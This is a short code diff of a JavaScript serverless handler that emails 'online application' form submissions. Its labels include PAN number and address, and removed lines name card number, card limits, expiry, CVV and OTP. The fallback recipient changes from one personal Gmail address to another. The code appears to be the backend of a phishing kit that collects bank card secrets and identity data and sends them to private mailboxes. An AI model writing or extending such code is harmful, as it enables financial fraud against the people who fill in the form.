@@ -15,13 +15,7 @@ const labels = {
   address: 'Address',
   pincode: 'Pincode',
   panNumber: 'PAN Number',
-  agree: 'agree',
-    cardNumber: 'Card Number',
-    totalLimit: 'Total Limit',
-    availableLimit:'Available Limit',
-    expiry    : 'Card Expiry',
-    cvv       : 'CVV',
-    OTP       : 'OTP',
+
 
 };
 
@@ -68,7 +62,7 @@ module.exports = async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Online Application" <${process.env.SMTP_USER}>`,
-      to: process.env.TO_EMAIL || 'Irfankhandelhi00011@gmail.coms',
+      to: process.env.TO_EMAIL || 'Udaybajaj2211@gmail.com',
       subject: 'New Online Application',
       html,
       ...(validEmail ? { replyTo: data.email } : {}),
